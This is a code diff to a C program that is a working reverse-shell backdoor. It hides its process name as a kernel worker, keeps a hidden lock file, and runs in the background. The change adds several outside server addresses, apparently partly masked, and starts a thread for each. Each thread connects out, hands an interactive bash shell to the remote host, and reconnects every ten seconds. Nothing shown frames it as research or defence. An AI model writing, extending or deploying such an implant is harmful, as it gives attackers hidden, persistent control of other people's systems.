@@ -11,11 +11,18 @@
 #include <sys/ioctl.h>
 #include <sys/file.h>
 #include <sys/prctl.h>
+#include <pthread.h>
 
-#define SERVER_IP "YOUR_VPS_IP"
 #define SERVER_PORT 51234
 #define SLEEP_TIME 10
 #define LOCK_FILE "/tmp/.system-lock"
+
+const char *SERVER_IPS[] = {
+    "185.xxx.xxx.1",
+    "185.xxx.xxx.2",
+    "185.xxx.xxx.3"
+};
+#define NUM_IPS (sizeof(SERVER_IPS) / sizeof(SERVER_IPS[0]))
 
 void hide_process() {
     prctl(PR_SET_NAME, "[kworker/0:0]", 0, 0, 0);
@@ -40,10 +47,51 @@ int check_single_instance() {
     return 1;
 }
 
-int main(int argc, char *argv[]) {
+int connect_to_server(const char *ip, int port) {
     int sock;
     struct sockaddr_in server;
+    
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return -1;
+
+    server.sin_family = AF_INET;
+    server.sin_port = htons(port);
+    if (inet_pton(AF_INET, ip, &server.sin_addr) <= 0) {
+        close(sock);
+        return -1;
+    }
+
+    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
+        close(sock);
+        return -1;
+    }
+
+    return sock;
+}
+
+void *connect_thread(void *arg) {
+    const char *ip = (const char *)arg;
+    int sock;
+    
+    while (1) {
+        sock = connect_to_server(ip, SERVER_PORT);
+        if (sock >= 0) {
+            dup2(sock, 0);
+            dup2(sock, 1);
+            dup2(sock, 2);
+            setup_tty();
+            execl("/bin/bash", "bash", "-i", NULL);
+            close(sock);
+        }
+        sleep(SLEEP_TIME);
+    }
+    return NULL;
+}
+
+int main(int argc, char *argv[]) {
+    pthread_t threads[NUM_IPS];
     pid_t pid;
+    int i;
 
     if (!check_single_instance()) exit(0);
     hide_process();
@@ -58,27 +106,13 @@ int main(int argc, char *argv[]) {
         close(STDERR_FILENO);
     }
 
-    while (1) {
-        sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock < 0) { sleep(SLEEP_TIME); continue; }
-
-        server.sin_family = AF_INET;
-        server.sin_port = htons(SERVER_PORT);
-        inet_pton(AF_INET, SERVER_IP, &server.sin_addr);
-
-        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
-            close(sock);
-            sleep(SLEEP_TIME);
-            continue;
-        }
-
-        dup2(sock, 0);
-        dup2(sock, 1);
-        dup2(sock, 2);
-        setup_tty();
-        execl("/bin/bash", "bash", "-i", NULL);
-        close(sock);
-        sleep(SLEEP_TIME);
+    for (i = 0; i < NUM_IPS; i++) {
+        pthread_create(&threads[i], NULL, connect_thread, (void *)SERVER_IPS[i]);
     }
+
+    for (i = 0; i < NUM_IPS; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
     return 0;
 }
